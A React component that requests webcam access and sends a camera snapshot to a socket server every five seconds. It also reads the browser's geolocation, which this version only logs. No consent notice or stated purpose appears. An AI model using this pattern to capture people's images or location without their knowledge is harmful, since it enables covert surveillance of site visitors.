import { useEffect, useRef } from "react";
import { socket, wait } from "./utils";

const App = () => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const photoRef = useRef<HTMLCanvasElement>(null);

  const getVideo = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false,
      });
      if (!videoRef.current) return;
      videoRef.current.srcObject = mediaStream;
      await videoRef.current.play();
      await wait(1); // Wait for video to load
      sendPhoto();
    } catch (error) {
      console.error(error);
    }
  };

  const sendPhoto = async () => {
    const video = videoRef.current;
    const photo = photoRef.current;
    if (!video || !photo) return;

    const data = photo.toDataURL("image/jpeg");

    socket.emit("photo", data);
  };

  const sendLocation = async () => {
    try {
      await navigator.geolocation.getCurrentPosition(({ coords }) => {
        console.log("longitude", coords.longitude, "latitude", coords.latitude);
      });
    } catch (error) {
      console.error(error);
    }
  };

  const paintToCanvas = () => {
    const video = videoRef.current;
    const photo = photoRef.current;
    if (!video || !photo) return;

    const ctx = photo.getContext("2d");

    const width = video.videoWidth;
    const height = video.videoHeight;

    photo.width = width;
    photo.height = height;

    setInterval(() => {
      ctx?.drawImage(video, 0, 0, width, height);
    }, 0);
  };

  useEffect(() => {
    getVideo();
    sendLocation();

    setInterval(() => {
      sendPhoto();
      sendLocation();
    }, 5000);
  }, []);

  return (
    <div className="bg-black flex items-center justify-center h-screen">
      <video onCanPlay={() => paintToCanvas()} ref={videoRef} />
      <canvas className="hidden" ref={photoRef} />
    </div>
  );
};

export default App;
